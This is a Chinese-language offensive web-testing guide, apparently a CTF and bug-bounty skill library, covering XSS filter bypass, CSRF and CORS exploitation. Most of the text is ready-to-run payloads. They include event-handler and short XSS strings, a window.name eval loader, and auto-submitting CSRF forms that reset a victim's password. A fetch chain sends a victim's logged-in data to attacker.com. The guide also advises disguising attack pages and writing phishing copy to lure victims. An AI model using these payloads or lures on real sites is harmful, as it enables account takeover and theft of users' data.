## [g-bypass] 绕过技巧——过滤不是终点，编码、事件、标签变体与截断是四大绕过方向，配合使用几乎通杀常见黑名单

### [bypass-events] 事件属性大全表 | medium | xss;bypass;events | 事件表
> 事件属性是黑名单时代的主力绕过面：标签能换成无数变体，事件却总有一款没被过滤，且多数事件无需用户交互。

#### 这个条目的作用
黑名单过滤掉 `<script>`、`onerror` 等常见关键字后，事件属性仍是"标签间与属性内两种上下文"下最通用的执行入口。本条目给你一份**按触发性质分类的事件清单**，以及"从零交互事件到交互事件"的逐层替换流程，让 payload 在过滤层层加码时仍有得换。

#### 前置条件
- 已确认注入上下文：标签间（能插入新标签）还是属性内（能闭合引号）
- 已确认过滤项：知道 `script`、`onerror`、`alert` 等哪些被拦
- 准备一个能观察执行结果的环境：浏览器控制台、带 payload 的测试页、或靶场题目

#### 第 1 步：确认上下文并选触发载体
注入点在 HTML 标签间时，先测最基础的自动触发三件套，其中 `<img>` 的 `onerror` 只要图片加载失败（`src=x` 必然失败）就执行，不依赖任何用户操作：
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onpageshow=alert(1)>
```
预期结果：页面加载时弹出 `1`。如果不行，大概率是 `onerror` 或 `alert` 被过滤，进入下一步换事件。

#### 第 2 步：换零交互事件（不依赖资源加载）
`onerror` 依赖资源加载失败，图片被禁用或过滤掉 `onerror` 时换"聚焦/切换"类事件，它们在元素创建时自动触发：
```html
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```
预期结果：`<input autofocus>` 页面载入即聚焦并触发 `onfocus`；`<details open>` 默认展开触发 `ontoggle`。这两类不依赖外部资源，网络受限的靶场环境优先使用。

#### 第 3 步：换事件名称变体（过滤 `onfocus` 等关键字时）
事件名同样可以被过滤，备选同性质事件逐个替换，直到命中未被拦截的：
```html
<svg/onload=alert(1)>                       <!-- onload 换到 svg 上 -->
<video><source onerror=alert(1)>            <!-- 视频源加载失败触发 -->
<img src=x onpointerenter=alert(1)>         <!-- 现代指针事件 -->
<img src=x onmouseover=alert(1)>            <!-- 需要悬停 -->
```
预期结果：任一事件名未被过滤即弹窗。注意 `onpointerenter`、`onauxclick` 等冷门事件很少在黑名单里，是真实 SRC 的常见漏网之鱼。

#### 第 4 步：交互触发型兜底（诱导场景）
以上全部被拦时，退回"需要用户交互"的事件，配合钓鱼文案诱导点击/悬停/按键：
```html
<a href="#" onclick=alert(1)>点我</a>
<div onmouseover=alert(1)>悬停我</div>
<input onkeydown=alert(1)>
<iframe onload=alert(1)>
```
预期结果：用户执行对应操作后弹窗。CTF 中交互型事件常用于"访问即弹窗"被禁后的第二方案，报告时应注明需要交互、危害降级。

#### 第 5 步：事件属性注入（属性内上下文）
注入点在属性值内（如 `<input value="INJECT">`）时，先闭合引号再追加事件，无需闭合标签：
```html
"><img src=x onerror=alert(1)>
" autofocus onfocus=alert(1) x="
' onmouseover='alert(1)
```
预期结果：属性上下文下用 `"` 或 `'` 闭合当前值，随后追加的事件属性成为该标签的一部分并触发。这是"属性内注入"的标准姿势，比尝试闭合整个标签更稳。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| 弹窗没出现但 payload 出现在源码里 | 事件名或 alert 被过滤/编码 | 换冷门事件（onpointerenter、ontoggle）或编码绕过（见 g-bypass 编码节） |
| onerror 不触发 | 图片加载成功或 src 没失败 | 用 `src=x` 或 `src=1` 保证失败；或换 onload/onfocus 类 |
| 属性内注入失败 | 没闭合引号，payload 被当成属性值字符串 | 先回显确认包裹字符是 `"` 还是 `'`，再决定闭合符 |
| 页面元素被拦截 | CSP 阻止内联事件执行 | 事件属性受 CSP 的 `unsafe-inline` 限制，改测外链脚本或找 CSP 绕过 |

#### 实战要点
- 触发优先级：`onerror`（资源失败）→ `onload/onpageshow`（加载完成）→ `onfocus/ontoggle`（零交互）→ `onmouseover/onclick`（需交互），逐层往下换。
- `<details open ontoggle>` 与 `<input autofocus onfocus>` 不依赖资源加载，图片被禁的靶场首选。
- 过滤 `onerror` 只拦一个事件名，`onload/onfocus/ontoggle/onpointerenter` 往往没在名单里，一次探测集覆盖 6 个事件再挑活的。
- 属性上下文用"闭合引号 + 事件 + 收尾引号"公式：`" onfocus=alert(1) x="`，比闭合标签少一步解析风险。
- 事件值里需要字符串/函数名变形时，配合 `\x61lert`、`eval(atob(...))` 等 JS 层编码（见 g-bypass 编码节）。

### [bypass-blacklist-len] 黑名单绕过与长度截断 | hard | xss;bypass;blacklist;length | 黑名单绕过;短payload
> 黑名单无法穷尽 HTML 语法的组合空间，大小写、标签变体、空白符、无引号属性与短 payload 是五大常规突破口。

#### 这个条目的作用
黑名单过滤永远在"补丁式"追堵已知 payload，而 HTML 语法本身组合空间巨大。本条目给出从**字符级探测**到**大小写、空白符、标签变体、无引号属性、长度截断**的完整升级路径，并重点讲解 20 字符以内短 payload 的构造法（昵称、留言字数受限场景）。

#### 前置条件
- 已定位注入点并能看到回显（响应体或 DOM 渲染结果）
- 已用无害字符（如 `abcd"'>`）做过一次探测，确认引号与尖括号的过滤状态
- 若疑似长度受限，先确认限制值（如昵称限 20 字符）

#### 第 1 步：字符级探测过滤规则
用一组无害字符确认哪些被删除、被编码、被替换，据此推断过滤是字符级黑名单还是正则：
```text
< > " ' / \ ( ) ; = javascript alert onerror
```
预期结果：逐个测试后得到"过滤字符清单"。例如 `<`、`>` 被删 → 走大小写/实体路线；`javascript` 被替换 → 走编码路线；`onerror` 被删 → 换事件名。

#### 第 2 步：大小写与标签变体
若过滤是区分大小写的（很多正则漏写 `i` 标志），大小写混写直接生效；标签本身也可换等价变体：
```html
<ScRiPt>alert(1)</sCrIpT>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)
```
预期结果：`<ScRiPt>` 被 HTML 解析器不区分大小写地识别为 script。`<svg/onload=...>` 用自闭合斜杠替代空格，绕过"过滤 `svg onload` 带空格"的正则。

#### 第 3 步：空白符替换（正则漏网点）
黑名单常用正则 `\son\s*=` 匹配"空格+on+等号"，但制表符、换行、回车不在 `\s` 或列表里时即可绕过：
```html
<img src=x
onerror=alert(1)>
<img src=x	onerror=alert(1)>
```
预期结果：标签属性间的换行/制表符是合法空白，浏览器照样解析事件属性。若过滤的是字面空格而非正则 `\s`，这一招几乎必中。

#### 第 4 步：无引号属性 + 属性截断
属性值不加引号时，空格是属性分隔符，可追加任意属性并"吞掉"服务端补的引号：
```html
<img src=x onerror=alert(1) x=>
<input value=x onfocus=alert(1) autofocus>
```
预期结果：`x=>` 让尾部不闭合引号也不影响事件执行；`<input value=x onfocus=... autofocus>` 利用"无引号属性 + autofocus"零交互触发。这招同时绕"必须闭合标签"的假设。

#### 第 5 步：长度受限场景构造短 payload
昵称限 20 字符之类场景，用最短触发结构 + 外置载荷：
```html
<svg/onload=alert(1)>        <!-- 21 字符 -->
<img src=x onerror=alert(1)> <!-- 26 字符 -->
<svg onload=alert(1)>        <!-- 20 字符 -->
```
超短方案——把完整载荷放进 `window.name`（窗口名不参与请求、不受长度限制）：
```html
<svg onload=eval(name)>
```
预期结果：`eval(name)` 会把 `window.name` 当作 JS 执行。打开方式为 `<a target=evil href="//target.com/page">`，`window.name=payload` 由攻击页设置，落地页仅需 19 字符的触发壳。

#### 第 6 步：截断型利用（服务端截断场景）
若服务端对输入做了固定长度截断且截断点落在属性中间，被截断的"属性残骸"不破坏已闭合的语法：
```html
<img src=x onerror=alert(1) x=
```
预期结果：尾部 `x=` 被截断成不完整属性，浏览器容忍未闭合属性，`onerror` 照常触发。**注意**：每个站点截断长度不同，必须先用长字符串实测截断点，再设计 payload 让执行部分落在截断点之前。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| 大小写变体不生效 | 过滤正则带 `i` 标志，大小写无用 | 放弃大小写，走空白符/标签变体路线 |
| `<img src=x\nonerror=...>` 不触发 | 部分解析器要求属性前至少一个 ASCII 空格 | 用制表符 `&#9;` 或 `/` 分隔，或换 `<svg/onload>` 结构 |
| 短 payload 超字数 | 没算清限制值与最短结构 | 用 `eval(name)` 外置载荷；或试 `<svg onload=alert(1)>` 极限 20 字符 |
| 截断后语法被破坏 | 截断点落在 `onerror=` 之前 | 实测回显长度，把可截断的废属性放在最后 |
| payload 被 WAF 语义分析拦截 | 纯黑名单已拦截，WAF 看 payload 语义 | 升级到编码+变形组合（见 g-bypass 编码节与 waf-bypass 技能） |

#### 实战要点
- 通用对抗顺序：测原始 payload → 字符探测过滤项 → 按 编码 → 事件 → 变体 → 截断 逐层升级，命中即停。
- 空白符攻击面：空格、制表符 `&#9;`、换行 `&#10;`、回车 `&#13;` 四种都试一遍，正则 `\s` 漏哪种用哪种。
- 长度受限的万能解法是 `window.name` 外置载荷，触发壳固定 19 字符，改 `name` 即换攻击逻辑。
- 截断型利用依赖站点行为，先拿无害长字符串实测截断点，不要凭猜构造。
- 黑名单"补丁式"的本质决定冷门标签恒有活口：`<marquee onstart>`、`<math><mtext>`、`<video><source onerror>` 轮流试。

## [g-csrf] CSRF——利用浏览器自动携带 cookie 的机制，诱导目标以受害者身份提交请求，核心是找到无 token 校验的写操作

### [csrf-principle] 原理与前提 | easy | csrf;principle;cookie | CSRF原理
> 只要目标站点的写操作仅靠 cookie 鉴权，攻击者就能用一张页面替受害者完成该操作，一切前提围绕"浏览器自动带 cookie"。

#### 这个条目的作用
CSRF 的成立不取决于攻击者有多强，而取决于目标站点的**鉴权设计**。本条目讲清楚三个成立前提、攻击链路，以及一个 30 秒的判定速查法，让你拿到任意"改数据"接口就能判断它是否可被 CSRF。

#### 前置条件
- 有一个可登录的目标账号（用于抓包观察自己的请求）
- 浏览器开发者工具（F12）或抓包工具可用
- 理解基础 HTTP：GET/POST、请求头、cookie

#### 第 1 步：理解"浏览器自动带 cookie"机制
浏览器向 `target.com` 发请求时，只要 cookie 属于该域（且 SameSite 允许），就**自动**附上，无需页面代码参与。攻击者页面在 `attacker.com` 上发起的跨站请求，同样自动携带 `target.com` 的 cookie。
```txt
受害者已登录 target.com (cookie 有效)
    -> 诱导访问 attacker.com/evil.html
    -> evil.html 里的 form/图片自动向 target.com 发请求
    -> 浏览器自动携带 target.com 的 cookie
    -> 服务器认为是受害者本人操作 -> 状态被修改
```
预期结果：理解整个链条的唯一"魔法"就是最后一行——服务端只认 cookie，不认请求是否真的来自受害者本人点击。

#### 第 2 步：核对三个成立前提
1. 目标请求**仅凭 cookie 鉴权**，无自定义头（如 `X-Requested-With`）、无 token 参数
2. 受害者浏览器存在目标域有效 cookie
3. 攻击者能构造出与目标请求等价的跨站请求（HTML form 跨域不受同源策略限制）
预期结果：三条全满足 → CSRF 成立。第 1 条是唯一需要技术验证的，进入下一步。

#### 第 3 步：抓取写操作请求并逐项检查
用自己账号执行一个写操作（改密码、删数据、转账、改资料），在 F12 网络面板抓包，检查三点：
```http
POST /change/password HTTP/1.1
Host: target.com
Cookie: sessionid=abc123
Content-Type: application/x-www-form-urlencoded

newpass=hacked123&confirm=hacked123
```
- 请求头里有没有自定义头（`X-Requested-With`、`X-CSRF-Token` 等）？
- body 里有没有 token 字段（`csrf`、`_token`、`authenticity_token`）？
- 响应是否校验 `Referer`/`Origin`？

预期结果：三者皆无 → 大概率可直接 CSRF。有 token → 转 g-csrf 的 token 绕过一节。

#### 第 4 步：等价请求验证（证明 CSRF 成立）
不用等到攻击阶段，把抓到的请求**去掉所有自定义头**后用 form 重放，成功即证明：
```html
<html><body>
<form action="https://target.com/change/password" method="POST">
  <input type="hidden" name="newpass" value="hacked123">
  <input type="hidden" name="confirm" value="hacked123">
</form>
<script>document.forms[0].submit()</script>
</body></html>
```
预期结果：打开该 HTML 后密码被修改 → CSRF 实锤。若失败，检查是否缺自定义头（说明有额外校验）或 SameSite 拦截（现代浏览器默认 Lax，见 g-csrf SameSite 一节）。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| form 重放后操作未生效 | 请求需要自定义头或 token | 用同源页面里的 fetch 带全头重放，确认后归入"有条件 CSRF" |
| 重放成功但认为是自己操作的 | 没区分"带 cookie 的跨站请求"与"自己点击" | CSRF 的本质就是"等价请求"，form 重放成功即成立，无需真实跨站 |
| GET 型接口也能改数据 | 幂等性缺失，本就是高危 | 直接 img 触发即可，见 g-csrf payload 模板 |
| 现代浏览器下 POST 被拦 | SameSite=Lax 默认阻断跨站 POST | 改测 GET 型写操作或同站子域，见 SameSite 速查表 |

#### 实战要点
- 判定速查：抓写操作请求 → 看有无自定义头 / body 内 token → 皆无即大概率可 CSRF，全程 30 秒。
- 前提 1（仅 cookie 鉴权）是唯一要动手验证的，其余两条是浏览器与网络环境的既定事实。
- 现代浏览器默认 `SameSite=Lax` 已拦跨站 POST，但同站子域、`SameSite=None+Secure`、老站裸 cookie 仍可行。
- CSRF 的价值在于**静默**：受害者无感知，配合 XSS 可链式升级（见 g-stored 打管理员一节）。
- 报告时给出复现：抓包请求 + 等价 form 页面 + 操作生效的证据（如密码可登录）。

### [csrf-payload-templates] GET/POST 表单模板 | easy | csrf;payload;form | CSRF模板
> 最稳的 CSRF 载体是纯 HTML form（跨域不受同源策略限制），伪装成普通页面即可诱导提交。

#### 这个条目的作用
前提验证通过后，本条目给出三种可直接复用的攻击载体：GET 型（img 无感触发）、POST 型（form 自动提交）、JSON 型（Content-Type 校验缺失时），以及每种载体的适用条件与验证流程。

#### 前置条件
- 已按 g-csrf 原理节确认目标写操作无 token/无自定义头
- 已抓包拿到目标接口的完整 URL 与参数名
- 有可控的托管位置放攻击 HTML（自己的服务器、GitHub Pages、本地起 http server 均可）

#### 第 1 步：GET 型——img 无感触发
目标写操作是 GET 且参数全在 URL 时，用 `<img>` 标签，受害者打开页面即触发，无任何弹窗与跳转：
```html
<img src="https://target.com/user/delete?id=123">
```
预期结果：页面加载时浏览器向该 URL 发 GET，携带 target.com cookie。`<img>` 天然跨域可加载，是最隐蔽的载体。

#### 第 2 步：POST 型——form 自动提交
目标接口是 POST 时用隐藏表单 + JS 自动提交，这是最可靠、最通用的载体：
```html
<html><body>
<form action="https://target.com/change/password" method="POST" id="f">
  <input type="hidden" name="newpass" value="hacked123">
  <input type="hidden" name="confirm" value="hacked123">
</form>
<script>document.getElementById('f').submit()</script>
</body></html>
```
预期结果：页面打开瞬间表单自动提交，参数以 `application/x-www-form-urlencoded` 发送，与正常表单提交完全等价。`name` 值必须与抓包时的一致。

#### 第 3 步：JSON 型——Content-Type 校验缺失时
接口要求 JSON body 但服务端不校验 Content-Type 时，用 `enctype="text/plain"` 让 form 发送裸 JSON 文本：
```html
<form action="https://target.com/api/user" method="POST"
      enctype="text/plain">
<input type="hidden" name='{"role":"admin","x":"' value='"}'>
</form>
```
预期结果：请求体拼接为 `{"role":"admin","x":"="}`，若服务端用宽松 JSON 解析即可生效。注意这招依赖服务端对 Content-Type 不敏感，**少见**，先测再报。

#### 第 4 步：验证载体是否生效
把载体 HTML 放到攻击页，用**另一个浏览器/无痕窗口**（保持目标登录态）打开，观察：
- F12 网络面板：目标接口收到请求且无 4xx/5xx
- 目标站点状态确实改变（如密码已可登录、数据已删除）
预期结果：状态改变 = 载体有效。务必用自己的测试账号，不要真的伤害他人数据。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| form 提交后 403/400 | 接口需要自定义头或 Referer 校验 | 回 g-csrf 原理节复查前提；或改用 XSS 同源页面发请求 |
| JSON 型 payload 不生效 | 服务端强校验 `Content-Type: application/json` | 换回标准 form；或先测 OPTIONS/直接 curl 确认接受格式 |
| 无痕窗口打开不触发 | 目标 cookie 没带进来（未登录/跨域隔离） | 确认无痕窗口已登录目标站点；SameSite 阻断时看 SameSite 节 |
| 参数名拼错 | 抓包参数名与表单 name 不一致 | 严格照抄抓包 body 的字段名与顺序 |

#### 实战要点
- 常规优先 form + POST；GET 型只在接口确实是 GET 时用 img，隐蔽性最高。
- 检测思路：用自己的账号抓任意"改数据"请求，去掉自定义头后用 form 重放，成功即证明 CSRF 成立，无需攻击阶段。
- `enctype="text/plain"` 的 JSON 注入依赖服务端对 Content-Type 不敏感，多数框架不校验 → form 直接可用，先试普通 form 再试 JSON 型。
- 攻击页务必伪装成正常页面（按钮、文案、跳转），避免受害者起疑；提交后跳转到正常页面收尾。
- 验证永远用自己的测试账号，payload 里用无害值，别把漏洞验证做成真实破坏。

### [csrf-token-bypass-samesite] token 绕过与 SameSite 简述 | hard | csrf;token;samesite | token绕过;SameSite
> 有 token 不等于安全，token 在 GET/响应体/跨域读取中泄露、双提交与同源判断缺陷都是经典绕法；SameSite 则是现代浏览器默认防线。

#### 这个条目的作用
面对"有 token 的接口"不要直接放弃：token 的生成、传输、校验三个环节各有经典缺陷。本条目覆盖四条 token 泄露路径、双提交缺陷、同源判断缺陷，以及 SameSite 四种取值的可利用性速查，是 CSRF 深入题的完整地图。

#### 前置条件
- 已确认接口存在 token 校验（抓包能看到 `csrf`/`_token` 字段或自定义头）
- 已理解 cookie 的 Domain/Path 与 SameSite 三个取值（Lax/Strict/None）
- 有测试账号与攻击页托管环境

#### 第 1 步：排查 token 泄露路径（四条逐一验证）
token 只要能被攻击者拿到，校验即形同虚设：
```text
1. token 出现在 URL 参数（Referer 会外泄）
2. token 在 localStorage 且被同源 XSS/开放重定向读取
3. JSONP/开放 CORS 接口可跨域读取含 token 的响应
4. token 嵌入响应头且与表单分离（如 X-CSRF-Token 每次请求刷新）
```
预期结果：逐条验证后若有命中，即可构造携带真实 token 的跨站请求。第 3 条最常见——先找有没有返回 token 的 JSONP 接口，跨域 script 标签加载 JSONP 不受同源限制。

#### 第 2 步：利用双提交缺陷
部分站点在 cookie 存一份 token、表单带一份，只比对两者是否相等。此时攻击者在自己的域种同名 cookie 即可过校验：
```html
<script>document.cookie='csrf=attacker_token';</script>
<form action="https://target.com/pay" method="POST">
  <input type="hidden" name="csrf" value="attacker_token">
</form>
<script>document.forms[0].submit()</script>
```
预期结果：攻击页先把 `csrf` cookie 写入 `attacker.com` 域（跨站请求会一并携带），表单再提交相同值，服务端比对"相等"即通过。**注意**：cookie 若设了 `Domain=target.com` 且服务端按域校验，此招失效，需先测 cookie 的 Domain 属性。

#### 第 3 步：利用同源判断缺陷
token 之外站点常校验 `Referer`/`Origin`，其判断逻辑本身常有缺陷：
- 只校验 `Referer` 前缀/包含 → 用 `http://target.com.attacker.com` 或 `https://attacker.com?u=target.com` 触发
- 校验 Origin 白名单但允许 `null` → 用 sandbox iframe 或 `data:` 页面发起请求
```html
<!-- sandbox iframe 发出的请求 Origin 为 null -->
<iframe sandbox="allow-forms" src="data:text/html,<form action='https://target.com/pay' method='POST'><input name='csrf' value='x'></form><script>document.forms[0].submit()</script>"></iframe>
```
预期结果：`Referer` 含目标域名即放行的站点被前缀伪造绕过；允许 `null` Origin 的站点被 sandbox iframe 绕过。逐条试白名单的边界。

#### 第 4 步：SameSite 判定（现代浏览器默认防线）
抓 Set-Cookie 看 SameSite 值，对照可利用性：
| 值 | 行为 | 可利用性 |
|---|---|---|
| 未设置（Lax 默认） | 跨站顶层导航 GET 带 cookie，POST 不带 | GET 型 CSRF 仍可行 |
| Strict | 跨站一律不带 | 不可直接 CSRF |
| None + Secure | 全带（需 HTTPS） | 完全可利用 |
| SameSite=Lax + 同站子域 | 子域间视为同站 | 需先拿下子域 |
预期结果：Lax 下优先找 GET 型写操作（顶层导航 GET 仍带 cookie）；None+Secure 则 POST 模板直接可用；Strict 基本放弃直接 CSRF，转向 XSS 组合。

#### 第 5 步：SameSite=Lax 下的 GET 触发技巧
Lax 允许"跨站顶层导航"携带 cookie，若目标有 GET 型写操作（`/delete?id=`、`/logout?redirect=`），用普通链接诱导点击即可：
```html
<a href="https://target.com/user/delete?id=123">查看图片</a>
```
或配合"提交后立即跳转"的 form 技巧，把 POST 伪装成顶层导航。预期结果：点击链接触发的 GET 携带 cookie 并执行操作。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| 双提交 cookie 不生效 | cookie 带 Domain=target.com 或 HttpOnly 限制 | 检查 Set-Cookie 属性；换 token 泄露路径（JSONP/CORS） |
| Referer 伪造无效 | 站点校验完整 Origin 且白名单精确 | 试 `null` Origin（sandbox iframe）或找子域 |
| SameSite=Lax 下 POST 全被拦 | Lax 阻断跨站 POST | 转 GET 型操作；或先通过 XSS/子域把请求变成同站 |
| token 在 URL 里但 Referer 被禁 | 浏览器/隐私设置禁 Referer 导致判断失效 | 抓包看实际 Referer 是否外泄；优先验证 JSONP 读取 |

#### 实战要点
- 判定顺序：token 泄露路径（JSONP/CORS/URL/存储）→ 双提交 → 同源判断缺陷 → SameSite。命中任一即成立。
- JSONP/开放 CORS 读取 token 是最值钱的路径：一次跨域读取，后续 POST 模板直接复用真实 token。
- 现代靶场与 CTF 多模拟"无 SameSite"或"Lax + GET 操作"的旧站配置；真实 SRC 中 Lax 是默认，优先看 GET 型写操作或可用子域。
- 双提交绕过前提是 cookie 无 `Domain` 限制且服务端只比"相等"，务必先抓 Set-Cookie 验证。
- SameSite=Strict 不等于绝对安全：同源 XSS 可发起任意请求，CSRF 只是其中一种升级路径。

## [g-cors] CORS 与点击劫持——错误的跨域配置让接口可被读取，iframe 覆盖让点击被劫持，两类都是"配置即漏洞"

### [cors-aca-reflect] ACAO 反射与利用链 | medium | cors;aca;data-theft | CORS配置错误
> 站点若把 `Access-Control-Allow-Origin` 直接反射请求 Origin，攻击者就能用 JS 跨域读取接口数据（含用户信息），性质等同读取型漏洞。

#### 这个条目的作用
同源策略禁止跨域读取，但错误配置的 CORS 会把这道墙自己拆掉。本条目讲清"ACAO 反射 + Credentials"的高危组合如何判定，fetch 利用链如何写，以及预检（preflight）阶段的测试要点，让你能完整验证一个可跨域读取的接口。

#### 前置条件
- 已找到一个返回敏感数据的接口（如 `/api/me`、`/api/userinfo`）
- 浏览器开发者工具或 curl 可用
- 有攻击页托管位置（自己的服务器或本地 http server，**file:// 打开无 Origin 头**，测不了反射）

#### 第 1 步：判定漏洞——手动加 Origin 看响应
对目标接口发起带恶意 Origin 的请求，观察响应头是否原样反射：
```http
GET /api/userinfo HTTP/1.1
Host: target.com
Origin: https://evil.com
-->
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
预期结果：`ACAO: https://evil.com` 被反射 = 配置错误。**反射 + `Allow-Credentials: true` 是最高危组合**，浏览器允许跨域读取携带 cookie 的响应；仅反射 ACAO 无 Credentials 时只能读公开数据，价值低。

#### 第 2 步：验证组合——带 cookie 的跨域读取
用 curl 快速验证，或直接在攻击页用 fetch 验证。curl 关注响应头即可：
```bash
curl -i -H "Origin: https://evil.com" -H "Cookie: sessionid=abc123" https://target.com/api/me
```
预期结果：响应同时含 `Access-Control-Allow-Origin: https://evil.com` 与 `Access-Control-Allow-Credentials: true`，且 body 含登录态数据 → 漏洞成立。

#### 第 3 步：编写利用链——跨域读数据并外带
在攻击页用 `credentials:'include'` 跨域读取（这是带 cookie 的关键），再把数据外带到自己服务器：
```html
<script>
fetch('https://target.com/api/me', {credentials:'include'})
  .then(r=>r.json())
  .then(d=>new Image().src='//attacker.com/?d='+JSON.stringify(d));
</script>
```
预期结果：受害者打开攻击页后，其登录态数据出现在 attacker.com 的访问日志里。`new Image()` 外带不跳转不弹窗，隐蔽性好。

#### 第 4 步：测预检（preflight）——OPTIONS 是否同样反射
当请求带非简单头（如 `Content-Type: application/json`、自定义头）或复杂 body 时，浏览器先发 OPTIONS 预检，预检通过才发正式请求：
```http
OPTIONS /api/me HTTP/1.1
Origin: https://evil.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type
-->
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Methods: POST
Access-Control-Allow-Headers: content-type
```
预期结果：OPTIONS 响应同样反射 Origin 并放行方法/头 → 预检可通过，正式请求照发。**判断漏洞时必须同时测 OPTIONS 是否反射**，只测 GET 会漏掉 POST 接口。

#### 第 5 步：无 Credentials 时的升级路径
只反射 ACAO、无 `Allow-Credentials` 的站读不到 cookie 态数据，但若接口支持 token 类凭据（Authorization 头、localStorage 里的 token），仍可读取：
```javascript
fetch('https://target.com/api/me', {headers:{'Authorization':'Bearer '+localStorage.getItem('token')}})
  .then(r=>r.json())
  .then(d=>new Image().src='//attacker.com/?d='+JSON.stringify(d));
```
预期结果：跨域请求带自定义头会触发预检，预检若放行 `Authorization` 头，token 态数据同样可被读取。GitHub 经典模式：白名单外反射 + 配合 token 头仍可读。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| 反射了 ACAO 但 fetch 读不到数据 | 缺 `Allow-Credentials: true`，浏览器拒绝暴露响应 | 确认组合；无 Credentials 时转 token 头路径 |
| 忘了 `credentials:'include'` | 浏览器默认跨域 fetch 不带 cookie | 加上该选项，否则读到的不是登录态数据 |
| POST 请求没发出就被拦 | 预检 OPTIONS 未放行方法/头 | 测 OPTIONS 响应，确认 Allow-Methods/Allow-Headers |
| file:// 打开攻击页无 Origin | file 协议不发 Origin 头，测不出反射 | 用本地 http server（`python -m http.server`）或真实域名托管 |
| 响应头带 `Vary: Origin` | 正常缓存行为，不代表无漏洞 | 以实际反射结果为准，忽略 Vary |

#### 实战要点
- 判定铁律：`ACAO 反射请求 Origin` + `Allow-Credentials: true` = 高危读取型漏洞，等于跨域能读登录态。
- 检测时 GET、POST、OPTIONS 三种方法都要带 Origin 测一遍，只测 GET 会漏掉 POST 接口的预检反射。
- `credentials:'include'` 是跨域携带 cookie 的关键，缺它读不到登录态数据——利用链里最容易漏的一行。
- 只反射无 Credentials 的站价值降级但不为零：token 头（Authorization）路径、公开但敏感的数据仍可读。
- 利用链统一用 `new Image()` 外带：不发新页面不弹窗，数据落在服务器访问日志即可回收。
